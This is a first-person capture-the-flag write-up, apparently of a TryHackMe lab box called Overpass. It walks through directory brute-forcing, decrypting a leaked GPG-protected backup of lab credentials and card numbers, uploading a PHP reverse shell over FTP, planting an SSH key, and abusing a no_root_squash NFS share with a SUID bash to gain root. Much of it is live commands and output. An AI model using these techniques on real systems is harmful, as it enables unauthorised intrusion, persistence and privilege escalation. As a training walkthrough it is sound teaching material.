Checking out the home page, I found some usernames.
```
Paradox - Our lead web designer, Paradox can help you create your dream website from the ground up
Elf - Overpass' newest intern, Elf. Elf helps maintain the webservers day to day to keep your site running smoothly and quickly.
MuirlandOracle - HTTPS and networking specialist. Muir's many years of experience and enthusiasm for networking keeps Overpass running, and your sites, online all of the time.
NinjaJc01 - James started Overpass, and keeps the business side running. If you have pricing questions or want to discuss how Overpass can help your business, reach out to him!
```
A quick `gobuster` scan found the /backups directory with a downloadable backup.zip file.
```
┌──(kali㉿heart)-[~]
└─$ gobuster dir -u http://10.10.65.108/ -w directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.65.108/
[+] Threads:        10
[+] Wordlist:       directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/17 13:31:16 Starting gobuster
===============================================================
/backups (Status: 301)
Progress: 141023 / 220561 (63.94%)
[...]
┌──(kali㉿heart)-[~/THM]
└─$ unzip backup.zip
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg
  inflating: priv.key
┌──(kali㉿heart)-[~/THM]
└─$ gpg --import priv.key
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
┌──(kali㉿heart)-[~/THM]
└─$ gpg -o CustomerDetails.xlsx -d CustomerDetails.xlsx.gpg
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
```

The XLSX file contains the following info:

| Customer Name   | Username       | Password          | Credit card number  | CVC |
|-----------------|----------------|-------------------|---------------------|-----|
| Par. A. Doxx    | paradox        | ShibesAreGreat123 | 4111 1111 4555 1142 | 432 |
| 0day Montgomery | 0day           | OllieIsTheBestDog | 5555 3412 4444 1115 | 642 |
| Muir Land       | muirlandoracle | A11D0gsAreAw3s0me | 5103 2219 1119 9245 | 737 |


While exploring the above, I had an `nmap` scan running that discovered HTTP, FTP, and SSH services on their default ports. I tried the usernames and passwords for SSH with no luck, and then tried to anonymous login to FTP with no luck. The paradox:ShibesAreGreat123 credentials did work for FTP, and I was able to put a PHP reverse shell at /rev.php on the web server. I also added a LinPEAS just in case I needed it later.

```
──(kali㉿heart)-[~/THM]
└─$ ftp 10.10.65.108
Connected to 10.10.65.108.
220 (vsFTPd 3.0.3)
Name (10.10.65.108:kali): paradox
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
226 Directory send OK.
ftp> put rev.php 
local: rev.php remote: index.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
2512 bytes sent in 0.00 secs (27.2231 MB/s)
ftp> put linpeas.sh
local: linpeas.sh remote: linpeas.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
319969 bytes sent in 0.58 secs (537.4261 kB/s)
```
Listening with `nc -nlvp 8080` in the terminal, I established a shell when I opened the the /rev.php webpage.

```
┌──(kali㉿heart)-[~]
└─$ nc -nlvp 8080
Listening on 0.0.0.0 8080
Connection received on 10.10.65.108 53812
Linux ip-10-10-65-108 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 22:22:04 up  1:09,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (889): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ whoami 
whoami
apache
sh-4.4$ find / -name *flag -type f 2>/dev/null
find / -name *flag -type f 2>/dev/null
/usr/sbin/grub2-set-bootflag
/usr/share/httpd/web.flag
sh-4.4$ cat /usr/share/httpd/web.flag
cat /usr/share/httpd/web.flag
thm{CENSORED}
sh-4.4$ ls /home
ls /home
james
paradox
```
I found the web flag and also learned of the users james and paradox on the box. I then thought to check if paradox reuses passwords:

```
sh-4.4$ su paradox
su paradox
Password: ShibesAreGreat123
whoami
paradox
```

He did! I still didn't have access to Python or Perl, so I still didn't have a TTY shell. Let's fix that by adding our public key to paradox's ~/.ssh/authorized_keys list, so we can SSH in.

```
echo 'ssh-rsa {public-key} kali@heart' >> /home/paradox/.ssh/authorized_keys
exit
┌──(kali㉿heart)-[~]
└─$ ssh 10.10.65.108 -l paradox
Last login: Sun Jan 17 22:39:03 2021
[paradox@ip-10-10-65-108 ~]$ ls
backup.zip  CustomerDetails.xlsx  CustomerDetails.xlsx.gpg  priv.key
```
I checked some common escalation pathways but came up short, so I ran LinPEAS.
```
[paradox@ip-10-10-68-24 ~]$ cd /var/www/html
[paradox@ip-10-10-68-24 html]$ ls
backups  hallway.jpg  index.html  linpeas.sh  main.css  overpass.svg  rev.php
[paradox@ip-10-10-68-24 html]$ bash linpeas.sh
 Starting linpeas. Caching Writable Folders...
...
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
...
```
LinPEAS discovered that /home/james is being shared using Network File Share (NFS) and that it is misconfigured. User paradox does not have `sudo` permissions, so I could not explicitly `sudo mount` it. However, I realized the port the share was on could be forwarded out and my Attack box could mount it with privileges. Let's check the port:
```
[paradox@ip-10-10-68-24 ~]$ rpcinfo -p
   program vers proto   port  service
...
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  53606  nlockmgr
...
```
Since I already put a key in authorized_keys and I now knew the port the share was on (2049), I ran the following from my Attack box to tunnel the share out.
```
┌──(kali㉿heart)-[~]
└─$ ssh paradox@10.10.68.24 -L 2049:localhost:2049
Last login: Sun Jan 24 21:58:31 2021 from 10.2.59.152
[paradox@ip-10-10-68-24 ~]$
```
Back on my attack box, I used tricks from the Hacktricks page LinPEAS recommended to mount james' home directory.
```
┌──(kali㉿heart)-[~/THM]
└─$ mkdir nfs
┌──(kali㉿heart)-[~/THM]
└─$ sudo mount -v -t nfs localhost:/ /home/kali/THM/nfs
mount.nfs: timeout set for Sun Jan 24 14:04:55 2021
mount.nfs: trying text-based options 'vers=4.2,addr=127.0.0.1,clientaddr=127.0.0.1'
mount.nfs: mount(2): Invalid argument
mount.nfs: trying text-based options 'vers=4.1,addr=127.0.0.1,clientaddr=127.0.0.1'
mount.nfs: mount(2): Invalid argument
mount.nfs: trying text-based options 'vers=4.0,addr=127.0.0.1,clientaddr=127.0.0.1'
┌──(kali㉿heart)-[~/THM]
└─$ ls -a nfs
.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .ssh  user.flag
┌──(kali㉿heart)-[~/THM]
└─$ cat nfs/user.flag
thm{censored}
```
The .ssh folder looks promising for escalation.
```
┌──(kali㉿heart)-[~/THM]
└─$ cd nfs/.ssh
┌──(kali㉿heart)-[~/THM/nfs/.ssh]
└─$ ls
authorized_keys  id_rsa  id_rsa.pub
┌──(kali㉿heart)-[~/THM/nfs/.ssh]
└─$ ssh james@10.10.68.24 -i id_rsa
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
[james@ip-10-10-68-24 ~]$
```
Running LinPEAS as james didn't uncover anything new. I thought for a bit and realized I had root permissions in james' home folder when mounted on my Attack box, so I could create a root privilege generator with /bin/bash and a simple addition of a SUID bit!
```
┌──(kali㉿heart)-[~/THM/nfs]
└─$ cp /bin/bash .
┌──(kali㉿heart)-[~/THM/nfs]
└─$ chmod +s bash
...
[james@ip-10-10-68-24 ~]$ ls
bash  user.flag
[james@ip-10-10-68-24 ~]$ ./bash -p
./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash)
```
Uh oh, incompatible versions. Let's use their /bin/bash instead, as I probably should've from the start!
```
[james@ip-10-10-68-24 ~]$ rm bash
rm: remove write-protected regular file 'bash'? y
[james@ip-10-10-68-24 ~]$ cp /bin/bash .
[james@ip-10-10-68-24 ~]$ ls -l bash
-rwxr-xr-x 1 james james 1219248 Jan 24 22:50 bash
...
┌──(kali㉿heart)-[~/THM/nfs]
└─$ sudo su
[sudo] password for kali:
┌──(root💀heart)-[/home/kali/THM/nfs]
└─# chown root bash
┌──(root💀heart)-[/home/kali/THM/nfs]
└─# chmod +s bash
...
[james@ip-10-10-68-24 ~]$ ls -l bash
-rwsr-sr-x 1 root james 1219248 Jan 24 22:50 bash
[james@ip-10-10-68-24 ~]$ ./bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/root.flag
thm{censored}
```
And, root!